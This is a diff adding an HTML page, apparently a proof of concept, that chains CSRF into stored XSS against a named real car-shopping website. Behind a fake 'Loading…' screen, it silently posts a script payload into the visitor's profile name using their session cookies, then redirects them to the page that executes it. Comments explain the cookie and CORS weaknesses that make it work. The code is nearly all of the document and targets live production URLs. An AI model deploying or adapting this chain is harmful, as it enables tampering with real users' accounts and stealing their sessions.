@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Loading…</title></head>
+<body>
+<h3 style="font-family:monospace">Please wait…</h3>
+<script>
+// FULL CHAIN:
+//  1. CSRF - plant stored-XSS into the victim's profile firstName via a
+//     cross-origin "simple request" (text/plain => no CORS preflight).
+//     Authenticated cross-site because KEYCLOAK_ADAPTER_STATE is SameSite=None.
+//  2. Redirect - send the victim to the page that renders the stored name:
+//     https://www.cargurus.com/Cars/garage/manage/viewSettings.action
+var PAYLOAD = "aaa<svg/onload=alert(document.cookie)>";
+
+var URL = "https://www.cargurus.com/Cars/myAccount/accountSettings?type=fullName&_data=./routes/account-settings/route";
+var BODY = JSON.stringify({ profile: { firstName: PAYLOAD, lastName: "aaa" } });
+
+function goToTrigger() {
+  setTimeout(function () {
+    location.replace("https://www.cargurus.com/Cars/garage/manage/viewSettings.action");
+  }, 1500);
+}
+
+try {
+  fetch(URL, {
+    method: "POST",
+    credentials: "include",          // send SameSite=None session cookies cross-site
+    headers: { "Content-Type": "text/plain" },
+    body: BODY
+  }).then(goToTrigger).catch(goToTrigger);
+} catch (e) {
+  goToTrigger();
+}
+</script>
+</body>
+</html>
